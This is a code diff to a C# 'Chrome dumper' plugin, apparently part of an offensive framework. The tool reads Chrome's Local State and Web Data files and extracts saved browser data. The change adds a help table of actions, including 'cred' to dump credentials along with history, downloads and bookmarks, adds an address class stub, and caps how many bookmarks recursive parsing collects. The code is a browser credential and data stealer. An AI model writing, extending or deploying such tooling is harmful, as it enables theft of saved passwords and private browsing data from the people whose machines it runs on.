@@ -38,19 +38,23 @@ namespace Plugin48Dumper
         private string LocalStateFile { get { return Path.Combine(UserDataFile, "Local State"); } }
         private string WebDataFile { get { return Path.Combine(DefaultDir, "Web Data"); } }
 
-        public Dictionary<string, string> m_dicModule = new Dictionary<string, string>()
-        {
-            {
-                "history",
-                "Extract Chrome stored history records."
-            },
-        };
+        public DataTable dtHelp = new DataTable();
 
         public clsChromeDumper()
         {
             Description = "Chrome dumper.";
             Usage = "foo";
             Entry = "chrome";
+
+            dtHelp.Columns.Add("Action");
+            dtHelp.Columns.Add("Description");
+
+            dtHelp.Rows.Add("help", "Show help.");
+            dtHelp.Rows.Add("cred", "Dump credentials.");
+            dtHelp.Rows.Add("history", "Dump browser history records.");
+            dtHelp.Rows.Add("download", "Dump downloaded files.");
+            //dtHelp.Rows.Add("address", "Dump user's addresses.");
+            dtHelp.Rows.Add("bookmark", "Dump browser bookmarks.");
 
             Available = true;
         }
@@ -100,6 +104,11 @@ namespace Plugin48Dumper
         public class clsCreditCard
         {
             
+        }
+
+        public class clsAddress
+        {
+
         }
 
         public List<clsCredential> fnlsDumpCredential(int nCount = 100, string szRegex = "")
@@ -328,7 +337,7 @@ namespace Plugin48Dumper
             foreach (var r in roots.Children<JProperty>())
             {
                 var node = r.Value;
-                fnParseNode(node, r.Name, ls);
+                fnParseNode(node, r.Name, ls, nCount);
             }
 
             return ls;
@@ -624,9 +633,12 @@ namespace Plugin48Dumper
             return sR;
         }
 
-        private void fnParseNode(JToken node, string szCurrentPath, List<clsBookmark> output)
+        private void fnParseNode(JToken node, string szCurrentPath, List<clsBookmark> output, int nMaximum)
         {
             var type = node["type"]?.ToString();
+
+            if (nMaximum != -1 && output.Count >= nMaximum)
+                return;
 
             if (type == "url")
             {
@@ -649,10 +661,11 @@ namespace Plugin48Dumper
 
             foreach (var child in children)
             {
+
                 var name = child["name"]?.ToString();
                 var nextPath = string.IsNullOrEmpty(name) ? szCurrentPath : $"{szCurrentPath}/{name}";
 
-                fnParseNode(child, nextPath, output);
+                fnParseNode(child, nextPath, output, nMaximum);
             }
         }
 
